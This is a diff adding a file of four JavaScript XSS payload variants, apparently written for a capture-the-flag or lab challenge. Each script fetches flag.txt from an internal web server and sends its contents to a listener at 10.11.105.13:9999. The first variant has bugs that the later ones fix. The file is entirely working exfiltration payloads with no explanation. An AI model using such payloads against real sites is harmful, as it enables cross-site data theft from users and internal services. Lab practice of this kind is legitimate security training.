@@ -1,0 +1,75 @@
+<script>
+    fetch(
+        'http://10.10.58.34:8080/flag.txt', {
+            method: 'GET'
+        }
+    )
+    .then(response => {
+        if (!response.ok) {
+            throw Error(response.statusText)
+        }
+        else {
+
+        }
+        var flag = response.text
+        return flag
+    })
+    .then((flag) => {
+        fetch('http://10.11.105.13:9999/?flag=' + encodeURIComponent(flag)), {
+            method: 'GET'
+        }
+    })
+</script>
+
+
+
+
+<script>
+    fetch('http://127.0.0.1:8080/flag.txt', {
+        method: 'GET'
+    })
+    .then(response => {
+        if (!response.ok) {
+            throw Error(response.statusText);
+        }
+        return response.text(); // Correctly handle response.text() as a method
+    })
+    .then(flag => {
+        fetch('http://10.11.105.13:9999/?flag=' + encodeURIComponent(flag), {
+            method: 'GET'
+        })
+        .catch(err => console.error('Error exfiltrating flag:', err)); // Add error handling for exfiltration
+    })
+    .catch(err => console.error('Error fetching flag:', err)); // Add error handling for fetch
+</script>
+
+
+
+
+
+
+<script>
+    fetch('http://10.10.58.34:8080/flag.txt')
+    .then(response => {
+        if (!response.ok) {
+            throw Error(response.statusText);
+        }
+        return response.text().then(data => {
+            fetch('http://10.11.105.13:9999/?flag=' + encodeURIComponent(data));
+        });
+    })
+</script>
+
+
+<script>
+    fetch('http://127.0.0.1:8080/flag.txt')
+    .then(response => {
+        if (response.status === 200) {
+            return response.text().then(data=> {
+                fetch('http://10.11.105.13:9999/?flag=' + encodeURIComponent(data));
+            })
+        } else {
+            fetch('http://10.11.105.13:9999/?test=bad');
+        }
+    });
+</script>
